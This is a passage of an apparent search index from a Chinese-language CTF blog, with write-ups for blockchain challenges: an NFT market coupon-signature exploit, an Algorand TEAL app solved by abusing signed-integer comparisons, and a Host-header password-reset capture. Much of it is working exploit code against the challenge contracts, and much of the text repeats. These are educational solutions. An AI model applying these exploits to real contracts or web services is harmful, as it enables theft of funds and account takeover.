, 1 ], \"at\" , 1 , \"because\" , b '' ] serialized = eth_abi . encode ([ 'string' , 'address' , 'string' , 'address' , 'string' , '(address,uint256,uint256)' , 'string' , 'uint' , 'string' , 'bytes' ], data ) serialized = serialized [: - 32 ] # eth_abi==2.2.0\uff0c\u5f53 bytes \u957f\u5ea6\u4e3a 0 \u65f6\u4ecd\u586b\u5145\u4e86 32 \u5b57\u8282 \\x00\uff0c\u6bd4\u901a\u8fc7 solidity \u8fdb\u884c abi.encode() \u7684\u7ed3\u679c\u591a 32 \u5b57\u8282 sig = w3 . eth . account . _sign_hash ( w3 . solidityKeccak ([ 'bytes' ], [ serialized ]), private_key = account . privateKey ) assert w3 . eth . account . _recover_hash ( w3 . solidityKeccak ([ 'bytes' ], [ serialized ]), signature = sig . signature . hex ()) == account . address scoupon = ({ 'coupon' : ( 1 , 1 , account . address , account . address , b '' ), # \u8d2d\u4e70 tokenId \u4e3a 3 \u7684 TNFT 'signature' : ( sig . v , [ w3 . toHex ( sig . r ), w3 . toHex ( sig . s )]) }) transact ( 'market_contract.functions.purchaseWithCoupon(scoupon)' ) print ( 'TNFT count:' , nft_contract . functions . balanceOf ( account . address ) . call ()) print ( transact ( 'market_contract.functions.win()' ) . transactionHash . hex ())","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/tctf_nft_market/#flag","text":"flag{off_by_null_in_the_market_d711fbd6a7c0c015b42d}","title":"Flag"},{"location":"blockchain/tctf_nft_market/#_3","text":"Head Overflow Bug in Calldata Tuple ABI-Reencoding | Solidity Blog Formal Specification of the Encoding","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/tealyman/","tags":["smart contract","algorand","teal","beginner"],"text":"#smart contract #algorand #teal #beginner .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Use the TestNet. Submit by sending enough testnet algos to cover the current transaction fee to the CTF_Address. CTF_Address OH4YZ4QXWOWLHIUKPQAOMPBZBELCANRPRX3NI7SQFL2OFASHLBW5DTLDZQ AppID 163726037 \u89e3\u9898\u601d\u8def \u00b6 \u770b\u5730\u5740\u9996\u5148\u6392\u9664 Ethereum uwu \u6839\u636e TestNet \u548c algos \u9501\u5b9a Algorand \u751f\u6001 owo OH4YZ4QXWOWLHIUKPQAOMPBZBELCANRPRX3NI7SQFL2OFASHLBW5DTLDZQ \u4e3a\u666e\u901a\u8d26\u6237\uff0c 163726037 \u5bf9\u5e94\u9700\u8981\u4ea4\u4e92\u7684\u667a\u80fd\u5408\u7ea6\u8d26\u6237 Algorand \u667a\u80fd\u5408\u7ea6\u5305\u542b\u4e24\u90e8\u5206\uff0c ApprovalProgram \u548c ClearStateProgram \u3002 ApprovalProgram \u8d1f\u8d23\u5904\u7406\u4e3b\u5e94\u7528\u903b\u8f91\uff0c ClearStateProgram \u8d1f\u8d23\u5c06\u5bf9\u5e94\u667a\u80fd\u5408\u7ea6\u4ece\u8d26\u6237\u8bb0\u5f55\u4e2d\u79fb\u9664\uff0c\u6267\u884c\u6210\u529f\u8fd4\u56de \\(1\\) the flag will be sent to u once ur done with the app and provide the address enough to cover current transaction fees \u76ee\u6807\u662f\u4e0e\u5e94\u7528\u8fdb\u884c\u5b8c\u6574\u4ea4\u4e92\u3002\u4e0e\u5408\u7ea6\u4ea4\u4e92\u7684\u65b9\u6cd5\u5305\u62ec Opt-in\u3001Call(NoOp)\u3001Read state\u3001Update\u3001Close out\u3001Delete \u4ee5\u53ca Clear state \u5728\u5f00\u59cb\u4e0e\u4f7f\u7528\u672c\u5730\u72b6\u6001\u7684\u5e94\u7528\u4ea4\u4e92\u524d\uff0c\u8d26\u6237\u9700\u8981 Opt in \u5206\u6790 ApprovalProgram \uff0c\u6839\u636e OnCompletion \u7684\u7c7b\u578b\u6267\u884c\u76f8\u5173\u64cd\u4f5c\uff0c\u91cd\u70b9\u5173\u6ce8 OnCompletion == 0 \uff0c\u5373 NoOp\u3002\u76ee\u6807\u5e94\u7528\u652f\u6301 setup \u548c buy \u9996\u5148\u901a\u8fc7 setup \u5411\u5e94\u7528\u6ce8\u518c asset\uff0c\u5e76\u5411\u5e94\u7528\u8f6c\u79fb\u4e00\u90e8\u5206 asset \u4ee5\u4fbf\u540e\u7eed\u8d2d\u4e70\u64cd\u4f5c \u518d\u8fdb\u884c buy \uff0c\u9700\u8981\u53d1\u9001\u4e00\u4e2a\u4ea4\u6613\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u4ea4\u6613\u4e3a Payment\uff08\u5411\u5e94\u7528\u652f\u4ed8\u8d2d\u4e70 asset \u7684 algo\uff09\uff0c\u7b2c\u4e8c\u4e2a\u662f Application Call Approval Program 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 #pragma version 5 intcblock 1 0 4 9223372036854775808 // prepare block of uint64 constants for use by intc bytecblock 0x7374617274 0x656e64 0x61646d696e5f6b6579 0x6e66745f6964 // prepare block of byte-array constants for use by bytec // Deploy or Call? txn ApplicationID intc_1 // 0 == bnz label1 txn OnCompletion intc_1 // 0, NoOp, only execute the ApprovalProgram associated with this application ID, with no additional effects. == bnz label2 txn OnCompletion intc_0 // 1, OptIn, before executing the ApprovalProgram, allocate local state for this application into the sender's account data == bnz label3 txn OnCompletion pushint 2 // CloseOut, after executing the ApprovalProgram, clear any local state for this application out of the sender's account data. == bnz label4 txn OnCompletion pushint 5 // DeleteApplication == bnz label5 txn OnCompletion intc_2 // 4, UpdateApplication == bnz label6 err label6: intc_1 // 0 return label5: txn Sender global CreatorAddress == assert bytec_2 // \"admin_key\" app_global_get callsub label7 intc_0 // 1 return label4: intc_0 // 1 return label3: intc_0 // 1 return label2: txna ApplicationArgs 0 // 0-th value of the ApplicationArgs array of the current transaction pushbytes 0x7365747570 // \"setup\" == bnz label8 txna ApplicationArgs 0 pushbytes 0x627579 // \"buy\" == bnz label9 err label9: global CurrentApplicationAddress // Address that the current application controls txna Assets 0 // Foreign Assets listed in the ApplicationCall transaction asset_holding_get AssetBalance store 1 // store is_opted_in to the 1-th scratch space store 0 // store asset balance to the 0-th scratch space load 1 // load is_opted_in from the 1-th scratch space intc_1 // 0 load 0 callsub label10 && // if is_opted_in and asset balance > 0 txn Sender bytec_0 // \"start\" app_local_get global LatestTimestamp callsub label10 && global LatestTimestamp txn Sender bytec_1 // \"end\" app_local_get callsub label10 && txn GroupIndex // index=1 intc_0 // 1 - // GroupIndex - 1 gtxns TypeEnum // field F of the (GroupIndex - 1)-th transaction in the current group intc_0 // 1 == && txn GroupIndex // index=1 intc_0 // 1 - gtxns Sender txn Sender == && txn GroupIndex // index=1 intc_0 // 1 - gtxns Receiver global CurrentApplicationAddress == && global MinTxnFee txn GroupIndex // index=1 intc_0 // 1 - gtxns Amount callsub label10 && assert txna ApplicationArgs 1 btoi global LatestTimestamp + txn Sender bytec_0 // \"start\" app_local_get callsub label10 bnz label11 intc_1 // 0 return label11: txn Sender bytec_3 // \"nft_id\" app_local_get txn Sender callsub label12 intc_0 // 1 return label8: itxn_begin // begin preparation of a new inner transaction in a new transaction group intc_2 // 4 itxn_field TypeEnum // set field of the current inner transaction to AssetTransfer txna Assets 0 itxn_field XferAsset global CurrentApplicationAddress itxn_field AssetReceiver itxn_submit // execute the current inner transaction group txn Sender bytec_3 // \"nft_id\" txna Assets 0 app_local_put // store the nft_id in the sender's local state txn Sender pushbytes 0x73656c6c6572 // \"seller\" txn Sender app_local_put // store the seller address in the sender's local state txn Sender bytec_0 // \"start\" global LatestTimestamp app_local_put txn Sender bytec_1 // \"end\" txna ApplicationArgs 1 btoi app_local_put txn Sender bytec_0 // \"start\" app_local_get txn Sender bytec_1 // \"end\" app_local_get < assert // require start < end intc_0 // 1, approval return label1: bytec_2 // \"admin_key\" txn Sender app_global_put intc_0 // 1 return label12: store 3 store 2 global CurrentApplicationAddress load 2 asset_holding_get AssetBalance store 5 store 4 load 5 bz label13 itxn_begin intc_2 // 4 itxn_field TypeEnum load 2 itxn_field XferAsset load 3 itxn_field AssetCloseTo itxn_submit label13: retsub label7: store 6 global CurrentApplicationAddress balance intc_1 // 0 != bz label14 itxn_begin intc_0 // 1 itxn_field TypeEnum load 6 itxn_field CloseRemainderTo itxn_submit label14: retsub label10: store 8 store 7 intc_3 // 9223372036854775808 load 7 & bnz label15 intc_3 // 9223372036854775808, 0x8000000000000000 load 8 & bnz label16 load 7 load 8 < bnz label17 intc_1 // 0 retsub label17: intc_0 // 1 retsub label16: intc_1 // 0 retsub label15: intc_3 // 9223372036854775808 load 8 & bnz label18 intc_0 // 1 retsub label18: load 7 load 8 > bnz label19 intc_1 // 0 retsub label19: intc_0 // 1 retsub CTF_Address \u4f1a\u5411\u5b8c\u6210\u4ea4\u6613\u7684\u8d26\u6237\u53d1\u8d77 Transfer \u4ea4\u6613\uff0c\u5176\u4e2d\u5305\u542b\u4f7f\u7528 AlgoSMS \u52a0\u5bc6\u7684 Flag Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 from algosdk.v2client import algod from algosdk import transaction , account , constants from Crypto.Util.number import long_to_bytes from datetime import datetime import json def transact ( txn ): if not isinstance ( txn , list ): signed_txn = txn . sign ( private_key ) txid = algod_client . send_transaction ( signed_txn ) else : signed_txns = [ t . sign ( private_key ) for t in txn ] txid = algod_client . send_transactions ( signed_txns ) confirmed_txn = transaction . wait_for_confirmation ( algod_client , txid , 4 ) print ( f \"Transaction information: { json . dumps ( confirmed_txn , indent = 4 ) } \" ) return confirmed_txn private_key = '<private>' sender = account . address_from_private_key ( private_key ) app_id = 163726037 app_address = \"5K7JP6324NOEPDB5THIZY3FWHUKF4FBPJFYKIUX2SBNG264NUY6E3AI3BM\" algod_address = \"https://testnet-algorand.api.purestake.io/ps2\" algod_token = \"<api-key>\" headers = { \"X-API-Key\" : algod_token , } algod_client = algod . AlgodClient ( algod_token , algod_address , headers ) params = algod_client . suggested_params () # OptIn optin_txn = transaction . ApplicationOptInTxn ( sender , params , app_id ) transact ( optin_txn ) # Create asset create_txn = transaction . AssetCreateTxn ( sender , params , 100 , decimals = 2 , default_frozen = False , unit_name = \"CC\" , asset_name = \"Chicken Coin\" , manager = sender , ) res = transact ( create_txn ) asset_id = res [ 'asset-index' ] setup_txn = transaction . ApplicationNoOpTxn ( sender , params , app_id , [ b 'setup' , long_to_bytes ( int ( datetime . now () . timestamp () * 1000 ) + 0x80000000 )], foreign_assets = [ asset_id ], foreign_apps = [ asset_id ], ) transact ( setup_txn ) transfer_txn = transaction . AssetTransferTxn ( sender , params , app_address , 1 , asset_id , ) transact ( transfer_txn ) payment_txn = transaction . PaymentTxn ( sender , params , app_address , constants . MIN_TXN_FEE * 10 , ) noop_txn = transaction . ApplicationNoOpTxn ( sender , params , app_id , [ b 'buy' , long_to_bytes ( 9223372036854775808 )], foreign_assets = [ asset_id ], foreign_apps = [ asset_id ], ) gid = transaction . calculate_group_id ([ payment_txn , noop_txn ]) payment_txn . group = gid noop_txn . group = gid transact ([ payment_txn , noop_txn ]) close_txn = transaction . ApplicationCloseOutTxn ( sender , params , app_id , ) transact ( close_txn ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 const algosdk = require ( 'algosdk' ); const { unsealMessageFromNote } = require ( 'algosms' ); async function main () { const baseServer = 'https://testnet-algorand.api.purestake.io/idx2' const port = '' ; const token = { 'X-API-Key' : '<api-key>' } let indexerClient = new algosdk . Indexer ( token , baseServer , port ); const accRcpt = algosdk . mnemonicToSecretKey ( '<mnemonic>' ); /* get the TXN with encrypted note from indexer */ let SmsTXID = \"DPHCQMJZ7BKJZHZO674VWGUO3J7JJAIKFKGSAEDHBSQBVYGV4I7A\" ; const txn = await indexerClient . lookupTransactionByID ( SmsTXID ). do (); /* convert base64 to bytes */ const note = Buffer . from ( txn . transaction . note , 'base64' ); const senderAddr = txn . transaction . sender ; /* decrypt the note with recipient secret key */ const msg = unsealMessageFromNote ( note , senderAddr , accRcpt ); console . log ( msg ); } main (); Flag \u00b6 wctf{1_h0p3_y0u_d0nt_4cc1dent4lly_4get_t0_r3m0ve_th3_4pp} \u53c2\u8003\u8d44\u6599 \u00b6 Interact with smart contracts - Algorand Developer Portal Opcodes - Algorand Developer Portal PureStake Developer Portal algosms - npm","title":"TealyMan"},{"location":"blockchain/tealyman/#_1","text":"Use the TestNet. Submit by sending enough testnet algos to cover the current transaction fee to the CTF_Address. CTF_Address OH4YZ4QXWOWLHIUKPQAOMPBZBELCANRPRX3NI7SQFL2OFASHLBW5DTLDZQ AppID 163726037","title":"\u9898\u76ee"},{"location":"blockchain/tealyman/#_2","text":"\u770b\u5730\u5740\u9996\u5148\u6392\u9664 Ethereum uwu \u6839\u636e TestNet \u548c algos \u9501\u5b9a Algorand \u751f\u6001 owo OH4YZ4QXWOWLHIUKPQAOMPBZBELCANRPRX3NI7SQFL2OFASHLBW5DTLDZQ \u4e3a\u666e\u901a\u8d26\u6237\uff0c 163726037 \u5bf9\u5e94\u9700\u8981\u4ea4\u4e92\u7684\u667a\u80fd\u5408\u7ea6\u8d26\u6237 Algorand \u667a\u80fd\u5408\u7ea6\u5305\u542b\u4e24\u90e8\u5206\uff0c ApprovalProgram \u548c ClearStateProgram \u3002 ApprovalProgram \u8d1f\u8d23\u5904\u7406\u4e3b\u5e94\u7528\u903b\u8f91\uff0c ClearStateProgram \u8d1f\u8d23\u5c06\u5bf9\u5e94\u667a\u80fd\u5408\u7ea6\u4ece\u8d26\u6237\u8bb0\u5f55\u4e2d\u79fb\u9664\uff0c\u6267\u884c\u6210\u529f\u8fd4\u56de \\(1\\) the flag will be sent to u once ur done with the app and provide the address enough to cover current transaction fees \u76ee\u6807\u662f\u4e0e\u5e94\u7528\u8fdb\u884c\u5b8c\u6574\u4ea4\u4e92\u3002\u4e0e\u5408\u7ea6\u4ea4\u4e92\u7684\u65b9\u6cd5\u5305\u62ec Opt-in\u3001Call(NoOp)\u3001Read state\u3001Update\u3001Close out\u3001Delete \u4ee5\u53ca Clear state \u5728\u5f00\u59cb\u4e0e\u4f7f\u7528\u672c\u5730\u72b6\u6001\u7684\u5e94\u7528\u4ea4\u4e92\u524d\uff0c\u8d26\u6237\u9700\u8981 Opt in \u5206\u6790 ApprovalProgram \uff0c\u6839\u636e OnCompletion \u7684\u7c7b\u578b\u6267\u884c\u76f8\u5173\u64cd\u4f5c\uff0c\u91cd\u70b9\u5173\u6ce8 OnCompletion == 0 \uff0c\u5373 NoOp\u3002\u76ee\u6807\u5e94\u7528\u652f\u6301 setup \u548c buy \u9996\u5148\u901a\u8fc7 setup \u5411\u5e94\u7528\u6ce8\u518c asset\uff0c\u5e76\u5411\u5e94\u7528\u8f6c\u79fb\u4e00\u90e8\u5206 asset \u4ee5\u4fbf\u540e\u7eed\u8d2d\u4e70\u64cd\u4f5c \u518d\u8fdb\u884c buy \uff0c\u9700\u8981\u53d1\u9001\u4e00\u4e2a\u4ea4\u6613\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u4ea4\u6613\u4e3a Payment\uff08\u5411\u5e94\u7528\u652f\u4ed8\u8d2d\u4e70 asset \u7684 algo\uff09\uff0c\u7b2c\u4e8c\u4e2a\u662f Application Call Approval Program 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 #pragma version 5 intcblock 1 0 4 9223372036854775808 // prepare block of uint64 constants for use by intc bytecblock 0x7374617274 0x656e64 0x61646d696e5f6b6579 0x6e66745f6964 // prepare block of byte-array constants for use by bytec // Deploy or Call? txn ApplicationID intc_1 // 0 == bnz label1 txn OnCompletion intc_1 // 0, NoOp, only execute the ApprovalProgram associated with this application ID, with no additional effects. == bnz label2 txn OnCompletion intc_0 // 1, OptIn, before executing the ApprovalProgram, allocate local state for this application into the sender's account data == bnz label3 txn OnCompletion pushint 2 // CloseOut, after executing the ApprovalProgram, clear any local state for this application out of the sender's account data. == bnz label4 txn OnCompletion pushint 5 // DeleteApplication == bnz label5 txn OnCompletion intc_2 // 4, UpdateApplication == bnz label6 err label6: intc_1 // 0 return label5: txn Sender global CreatorAddress == assert bytec_2 // \"admin_key\" app_global_get callsub label7 intc_0 // 1 return label4: intc_0 // 1 return label3: intc_0 // 1 return label2: txna ApplicationArgs 0 // 0-th value of the ApplicationArgs array of the current transaction pushbytes 0x7365747570 // \"setup\" == bnz label8 txna ApplicationArgs 0 pushbytes 0x627579 // \"buy\" == bnz label9 err label9: global CurrentApplicationAddress // Address that the current application controls txna Assets 0 // Foreign Assets listed in the ApplicationCall transaction asset_holding_get AssetBalance store 1 // store is_opted_in to the 1-th scratch space store 0 // store asset balance to the 0-th scratch space load 1 // load is_opted_in from the 1-th scratch space intc_1 // 0 load 0 callsub label10 && // if is_opted_in and asset balance > 0 txn Sender bytec_0 // \"start\" app_local_get global LatestTimestamp callsub label10 && global LatestTimestamp txn Sender bytec_1 // \"end\" app_local_get callsub label10 && txn GroupIndex // index=1 intc_0 // 1 - // GroupIndex - 1 gtxns TypeEnum // field F of the (GroupIndex - 1)-th transaction in the current group intc_0 // 1 == && txn GroupIndex // index=1 intc_0 // 1 - gtxns Sender txn Sender == && txn GroupIndex // index=1 intc_0 // 1 - gtxns Receiver global CurrentApplicationAddress == && global MinTxnFee txn GroupIndex // index=1 intc_0 // 1 - gtxns Amount callsub label10 && assert txna ApplicationArgs 1 btoi global LatestTimestamp + txn Sender bytec_0 // \"start\" app_local_get callsub label10 bnz label11 intc_1 // 0 return label11: txn Sender bytec_3 // \"nft_id\" app_local_get txn Sender callsub label12 intc_0 // 1 return label8: itxn_begin // begin preparation of a new inner transaction in a new transaction group intc_2 // 4 itxn_field TypeEnum // set field of the current inner transaction to AssetTransfer txna Assets 0 itxn_field XferAsset global CurrentApplicationAddress itxn_field AssetReceiver itxn_submit // execute the current inner transaction group txn Sender bytec_3 // \"nft_id\" txna Assets 0 app_local_put // store the nft_id in the sender's local state txn Sender pushbytes 0x73656c6c6572 // \"seller\" txn Sender app_local_put // store the seller address in the sender's local state txn Sender bytec_0 // \"start\" global LatestTimestamp app_local_put txn Sender bytec_1 // \"end\" txna ApplicationArgs 1 btoi app_local_put txn Sender bytec_0 // \"start\" app_local_get txn Sender bytec_1 // \"end\" app_local_get < assert // require start < end intc_0 // 1, approval return label1: bytec_2 // \"admin_key\" txn Sender app_global_put intc_0 // 1 return label12: store 3 store 2 global CurrentApplicationAddress load 2 asset_holding_get AssetBalance store 5 store 4 load 5 bz label13 itxn_begin intc_2 // 4 itxn_field TypeEnum load 2 itxn_field XferAsset load 3 itxn_field AssetCloseTo itxn_submit label13: retsub label7: store 6 global CurrentApplicationAddress balance intc_1 // 0 != bz label14 itxn_begin intc_0 // 1 itxn_field TypeEnum load 6 itxn_field CloseRemainderTo itxn_submit label14: retsub label10: store 8 store 7 intc_3 // 9223372036854775808 load 7 & bnz label15 intc_3 // 9223372036854775808, 0x8000000000000000 load 8 & bnz label16 load 7 load 8 < bnz label17 intc_1 // 0 retsub label17: intc_0 // 1 retsub label16: intc_1 // 0 retsub label15: intc_3 // 9223372036854775808 load 8 & bnz label18 intc_0 // 1 retsub label18: load 7 load 8 > bnz label19 intc_1 // 0 retsub label19: intc_0 // 1 retsub CTF_Address \u4f1a\u5411\u5b8c\u6210\u4ea4\u6613\u7684\u8d26\u6237\u53d1\u8d77 Transfer \u4ea4\u6613\uff0c\u5176\u4e2d\u5305\u542b\u4f7f\u7528 AlgoSMS \u52a0\u5bc6\u7684 Flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/tealyman/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 from algosdk.v2client import algod from algosdk import transaction , account , constants from Crypto.Util.number import long_to_bytes from datetime import datetime import json def transact ( txn ): if not isinstance ( txn , list ): signed_txn = txn . sign ( private_key ) txid = algod_client . send_transaction ( signed_txn ) else : signed_txns = [ t . sign ( private_key ) for t in txn ] txid = algod_client . send_transactions ( signed_txns ) confirmed_txn = transaction . wait_for_confirmation ( algod_client , txid , 4 ) print ( f \"Transaction information: { json . dumps ( confirmed_txn , indent = 4 ) } \" ) return confirmed_txn private_key = '<private>' sender = account . address_from_private_key ( private_key ) app_id = 163726037 app_address = \"5K7JP6324NOEPDB5THIZY3FWHUKF4FBPJFYKIUX2SBNG264NUY6E3AI3BM\" algod_address = \"https://testnet-algorand.api.purestake.io/ps2\" algod_token = \"<api-key>\" headers = { \"X-API-Key\" : algod_token , } algod_client = algod . AlgodClient ( algod_token , algod_address , headers ) params = algod_client . suggested_params () # OptIn optin_txn = transaction . ApplicationOptInTxn ( sender , params , app_id ) transact ( optin_txn ) # Create asset create_txn = transaction . AssetCreateTxn ( sender , params , 100 , decimals = 2 , default_frozen = False , unit_name = \"CC\" , asset_name = \"Chicken Coin\" , manager = sender , ) res = transact ( create_txn ) asset_id = res [ 'asset-index' ] setup_txn = transaction . ApplicationNoOpTxn ( sender , params , app_id , [ b 'setup' , long_to_bytes ( int ( datetime . now () . timestamp () * 1000 ) + 0x80000000 )], foreign_assets = [ asset_id ], foreign_apps = [ asset_id ], ) transact ( setup_txn ) transfer_txn = transaction . AssetTransferTxn ( sender , params , app_address , 1 , asset_id , ) transact ( transfer_txn ) payment_txn = transaction . PaymentTxn ( sender , params , app_address , constants . MIN_TXN_FEE * 10 , ) noop_txn = transaction . ApplicationNoOpTxn ( sender , params , app_id , [ b 'buy' , long_to_bytes ( 9223372036854775808 )], foreign_assets = [ asset_id ], foreign_apps = [ asset_id ], ) gid = transaction . calculate_group_id ([ payment_txn , noop_txn ]) payment_txn . group = gid noop_txn . group = gid transact ([ payment_txn , noop_txn ]) close_txn = transaction . ApplicationCloseOutTxn ( sender , params , app_id , ) transact ( close_txn ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 const algosdk = require ( 'algosdk' ); const { unsealMessageFromNote } = require ( 'algosms' ); async function main () { const baseServer = 'https://testnet-algorand.api.purestake.io/idx2' const port = '' ; const token = { 'X-API-Key' : '<api-key>' } let indexerClient = new algosdk . Indexer ( token , baseServer , port ); const accRcpt = algosdk . mnemonicToSecretKey ( '<mnemonic>' ); /* get the TXN with encrypted note from indexer */ let SmsTXID = \"DPHCQMJZ7BKJZHZO674VWGUO3J7JJAIKFKGSAEDHBSQBVYGV4I7A\" ; const txn = await indexerClient . lookupTransactionByID ( SmsTXID ). do (); /* convert base64 to bytes */ const note = Buffer . from ( txn . transaction . note , 'base64' ); const senderAddr = txn . transaction . sender ; /* decrypt the note with recipient secret key */ const msg = unsealMessageFromNote ( note , senderAddr , accRcpt ); console . log ( msg ); } main ();","title":"Exploit"},{"location":"blockchain/tealyman/#flag","text":"wctf{1_h0p3_y0u_d0nt_4cc1dent4lly_4get_t0_r3m0ve_th3_4pp}","title":"Flag"},{"location":"blockchain/tealyman/#_3","text":"Interact with smart contracts - Algorand Developer Portal Opcodes - Algorand Developer Portal PureStake Developer Portal algosms - npm","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/tetctftoken/","tags":["web","smart contract"],"text":"#web #smart contract .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 So, this year, we have something cool for you. We hope you will enjoy it. Happy New Year. ~Cheers, Server: http://172.105.114.30:31337 tetctftoken.zip \u89e3\u9898\u601d\u8def \u00b6 \u4e0d\u592a\u5e38\u89c1\u7684 Web2 + Web3 \u7ec4\u5408\u9898\uff0c\u4e0d\u8fc7\u5e78\u597d\u4e24\u4e2a\u90e8\u5206\u53ef\u4ee5\u72ec\u7acb\u89e3\u9898 (=\u03c9=) Strellic \u5b8c\u6210\u4e86 Web2 \u7684\u90e8\u5206\uff0c\u5173\u952e\u70b9\u5728 app.py \u4e2d\u51fd\u6570 userType \u4f7f\u7528\u4e86 url_for('gen_token', Type=_secret_token, _external=True) \u6765\u83b7\u53d6 _secret_reset_passwd_URL \uff0c\u5e76\u5411\u5176\u53d1\u9001\u5305\u542b\u65b0\u5bc6\u7801\u7684\u8bf7\u6c42 \u56e0\u4e3a external=True \uff0c\u6240\u4ee5\u4f1a\u7ed3\u5408\u8bbe\u7f6e\u7684 SERVER_NAME \u6765\u751f\u6210\u5b8c\u6574\u7684 URL \u800c\u670d\u52a1\u5668\u5e76\u6ca1\u6709\u8bbe\u7f6e SERVER_NAME \uff0c\u56e0\u6b64\u4f1a\u4ece\u8bf7\u6c42\u5934\u4e2d\u83b7\u53d6 Host \u5b57\u6bb5\u4f5c\u4e3a SERVER_NAME 1 \u5c06 Host \u8bbe\u7f6e\u4e3a\u53ef\u63a7\u5730\u5740\uff0c\u518d\u53d1\u9001\u91cd\u7f6e\u5bc6\u7801\u7684\u8bf7\u6c42\uff0c\u5c31\u53ef\u4ee5\u76d1\u542c\u5230\u670d\u52a1\u5668\u8bf7\u6c42 /secret-token/<Type> \uff0c\u5176\u4e2d\uff0c Type \u5bf9\u5e94\u65b0\u7684\u8d26\u6237\u5bc6\u7801 TetCTFToken/templates/dashboard.html \u4e2d\u7ed9\u51fa\u4e86\u5408\u7ea6 TetCTFToken \u548c FlagStore \u7684\u5730\u5740\uff0c\u5e76\u5728 BscScan \u4e0a\u63d0\u4f9b\u4e86\u5408\u7ea6\u7684\u6e90\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 //SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; // \u4e3a\u4e86\u65b9\u4fbf\u9605\u8bfb\uff0c\u5c06\u7236\u5408\u7ea6\u8f6c\u6362\u6210 import \u7684\u5f62\u5f0f import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; contract TetCTFToken is ERC20 ( \"TetCTF Token\" , \"TetCTF\" ), Ownable , ReentrancyGuard { function mint ( address _to , uint _amount ) external onlyOwner { _mint ( _to , _amount ); } function burn ( address _from , uint _amount ) external onlyOwner { _burn ( _from , _amount ); } } contract FlagStore is Ownable , ReentrancyGuard { TetCTFToken public immutable token ; uint public flagPrice = 1337 * 1e18 ; mapping ( string => bool ) public flagClaimed ; constructor () { token = new TetCTFToken (); } function setFlagPrice ( uint price ) external onlyOwner { flagPrice = price ; } function deposit 